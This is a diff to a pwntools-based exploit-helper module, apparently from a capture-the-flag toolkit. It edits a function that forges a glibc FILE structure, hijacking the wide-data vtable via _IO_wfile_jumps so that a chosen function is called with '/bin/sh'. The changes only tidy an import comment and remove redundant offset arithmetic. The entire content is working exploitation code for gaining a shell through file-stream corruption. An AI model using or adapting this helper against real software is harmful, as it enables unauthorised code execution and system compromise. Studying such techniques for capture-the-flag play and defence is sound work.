@@ -1,4 +1,4 @@
-# from .helpers import _require_ctx, pwnctx
+# from . import _require_ctx, pwnctx
 from . import helpers as hlp
 from pwn import flat
 
@@ -64,8 +64,8 @@ def fsopsh(func=None, arg=b"/bin/sh\0", file=None, trigger=XSPUTN, lock=None):
         0x78: -1,
         0x88: lock, # empty zone as lock
         0x90: -1,
-        0xa0: file + (0xe0 - 0xe0), # wide_data
+        0xa0: file, # wide_data
         0xd0: func,
         0xd8: hlp.pwnctx.libc.sym["_IO_wfile_jumps"] - (trigger - OVERFLOW), # vtable
-        0xe0: file + (0xe0 - 0xe0) + (0xd0 - 0x68), # wide_data->vtable,
+        0xe0: file + (0xd0 - 0x68), # wide_data->vtable,
     }, filler=b"\0")
